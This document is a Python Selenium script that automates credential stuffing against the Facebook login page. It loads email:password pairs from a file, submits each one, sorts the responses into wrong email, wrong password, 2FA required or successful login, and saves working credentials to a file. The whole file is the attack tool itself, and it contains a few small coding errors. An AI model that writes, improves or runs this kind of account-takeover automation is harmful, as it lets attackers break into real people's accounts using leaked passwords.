from selenium import webdriver
from selenium.common import NoSuchElementException, TimeoutException
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options
import time
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.wait import WebDriverWait

SITES = ["https://www.facebook.com/login"]
EMAIL_FIELDS = ["email", "mail", "username"]
PASSWORD_FIELDS = ["pass", "password"]

EMAIL_FIELD_FOUND = False
PASS_FIELD_FOUND = False

EMAILS=[]
PASSWORDS=[]

COOKIE_CLICKED = False
LAST_CRED = False

#sum random options
options = Options()
options.add_argument("--disable-popup-blocking")
options.add_argument('--no-first-run')
options.add_argument('--no-default-browser-check')


# Path to the GECKODRIVER!!!
print('> initializing path:')
driver_path = "C:\\Your\\Path\\To\\geckodriver-v0.35.0-win64\\geckodriver.exe"

# Initialize Service
print('> Initializing service')
service = Service(driver_path)

#Initialize driver
print('> initializing driver')
driver = webdriver.Firefox(service=service, options=options)

time.sleep(1)

#Read the creds from creds.txt and format a luh bit
def opencreds():
    with open('creds.txt', 'r') as file:
        lines = file.readlines()
        for line in lines:
            stripped_line = line.strip()  
            if stripped_line:  
                split_line = stripped_line.split(':')
                print(split_line)
                EMAILS.append(split_line[0])
                PASSWORDS.append(split_line[1])


def getemailfield():
    for field in EMAIL_FIELDS:
        #Try to find by id
        try:
            email_field = driver.find_element(By.ID, field)
            print('> Found email field with ID: {}'.format(field))
            return email_field
        except NoSuchElementException:
            print('> Email field with ID: {} was not found'.format(field))

        #Try to find by name
        try:
            email_field = driver.find_element(By.NAME, field)
            print('> Found email field with NAME: {}'.format(field))
            return email_field
        except NoSuchElementException:
            print('> Email field with NAME: {} was not found'.format(field))

def getpasswfield():
    for field in PASSWORD_FIELDS:
        #Try to find pass field by id
        try:
            pass_field = driver.find_element(By.ID, field)  # Find the email input field
            print('> Found pass field with ID: {}'.format(field))
            return pass_field
        except NoSuchElementException:
            print('> Email field with ID: {} was not found'.format(field))

        #Try to find pass field by name
        try:
            pass_field = driver.find_element(By.ID, field)  # Find the email input field
            print('> Found pass field with ID: {}'.format(field))
            return pass_field
        except NoSuchElementException:
            print('> Email field with ID: {} was not found'.format(field))



def opensite(site, COOKIE_CLICKED):
    print('> opening {} login page...'.format(site))
    driver.get(site)
    time.sleep(1)
    # accept faceboook cookies
    if (site.__contains__("facebook") and COOKIE_CLICKED == False):

        try:
            #Finding the 'accept all cookies button', for some reason it has this weird id
            element = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.CSS_SELECTOR,
                                            'div.x1n2onr6.x1ja2u2z.x78zum5.x2lah0s.xl56j7k.x6s0dn4.xozqiw3.x1q0g3np.xi112ho.x17zwfj4.x585lrc.x1403ito.x972fbf.xcfux6l.x1qhh985.xm0m39n.x9f619.xn6708d.x1ye3gou.xtvsq51.x1r1pt67 span.x1lliihq.x6ikm8r.x10wlt62.x1n2onr6.xlyipyv.xuxw1ft'))
            )
            element.click()
            print("> Accepted cookies")

        except TimeoutException:
            print("> Element not clickable using CSS Selector")

def write_working_creds(line):
    with open('WorkingCreds.txt', 'w') as file:
        file.write(line + '\n')


def checkresult(email, password, site):
    page_source = driver.page_source
    print(driver.current_url)

    # Check if the specific word is in the page source
    if "isn’t connected to an account" in page_source or 'incorrect email' in page_source or 'wrong email' in page_source or 'wrong email' in page_source:
        print('> The email: {} is wrong for site: {}'.format(email,site))

    elif "The password you’ve entered is incorrect" in page_source or "incorrect password" in page_source or "wrong password" in page_source:
        print('> the email: {} is right for site: {}, but password: {} is wrong'.format(email, site,password))

    elif 'two_factor' in driver.current_url or 'two_factor' in page_source:
        print( 50*"#" + " \n 2FA NEEDED! for email: {} and password: {} on site: {}\n".format(email,password,site)+ "#"*50)
        write_working_creds("email: {}".format(email) + "   password: {}".format(password) + "   site: ".format(site) + "   2FA needed")
        opensite(site, False)
    elif 'incorrect' in driver.page_source or "onjuist" in driver.page_source or 'wrong' in driver.page_source or "niet" in driver.page_source:
        print("> Something was wrong but no idea what exactly, language potentially switched?")
    else:
        print("#"*50 + "\n" + "LOGIN SUCCESFULL!!!! " + "With email: {} and password:{}\n".format(email, password) + 50*"#")
        write_working_creds("email: {}".format(email) + "   password: {}".format(password) + "   site: ".format(site) + "   NO 2FA NEEDED!!!!!!!!!!!!!!!!")
        opensite(site, False)


for site in SITES:

    #open the file with all emails/passwords
    opencreds()

    #open the site and prepare login
    opensite(site, COOKIE_CLICKED)


    COOKIE_CLICKED = True

    for i in range(len(EMAILS)):
        if i == len(EMAILS):
            LAST_CRED = True

        password_field = getpasswfield()
        email_field = getemailfield()

        print("> Trying to send email {} and password {}".format(EMAILS[i], PASSWORDS[i]))
        time.sleep(1)
        email_field.send_keys(EMAILS[i])
        password_field.send_keys(PASSWORDS[i])

        # Find the login button and click it
        login_button = driver.find_element(By.NAME, "login")
        login_button.click()

        # Wait for the next page to load (can vary based on connection speed)
        print('> going to sleep')
        time.sleep(20)
        print ("> end sleep")

        checkresult(EMAILS[i], PASSWORDS[i], site)


